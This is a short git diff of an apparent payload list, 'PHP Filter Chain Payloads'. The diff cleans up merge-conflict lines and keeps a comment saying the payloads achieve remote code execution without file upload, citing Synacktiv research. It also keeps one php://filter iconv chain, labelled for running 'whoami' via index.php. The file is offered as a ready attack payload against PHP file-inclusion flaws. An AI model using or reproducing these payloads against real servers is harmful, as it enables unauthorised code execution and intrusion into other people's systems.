@@ -1,11 +1,6 @@
 # PHP Filter Chain Payloads
-<<<<<<< Updated upstream
 # These payloads use convert.iconv filters to achieve RCE without file upload
 # Reference: https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html
-=======
-# RCE without file upload via chained filters
-# Ref: Synacktiv PHP filter research
->>>>>>> Stashed changes
 
 # Basic system commands - whoami
 php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UCS-2.UTF8|convert.iconv.L6.UTF8|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=index.php
